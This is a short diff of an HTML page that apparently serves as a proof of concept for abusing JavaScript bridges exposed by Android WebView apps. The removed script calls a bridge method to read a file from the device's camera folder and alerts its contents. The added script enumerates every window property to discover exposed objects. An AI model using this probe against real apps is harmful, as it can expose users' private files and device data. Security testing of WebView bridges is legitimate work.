@@ -1,14 +1,12 @@
 <!DOCTYPE html>
 <html>
-  <body>
-    <script>
-      // Replace 'getFile' and 'file:///sdcard/DCIM/Camera/secret.jpg' as needed
-      if (window.bridge) {
-        var result = window.bridge.getFile('file:///sdcard/DCIM/Camera/exploit.jpg');
-        alert('File contents: ' + result);
-      } else {
-        alert('No bridge object found');
-      }
-    </script>
+ <body style="background-color: #fff; color: #e5e7eb; font-family: monospace;">
+<script>
+  if (window) {
+    Object.getOwnPropertyNames(window).forEach(function (v, i) {
+      document.writeln(v + "<br>");
+    });
+  }
+</script>
   </body>
 </html>
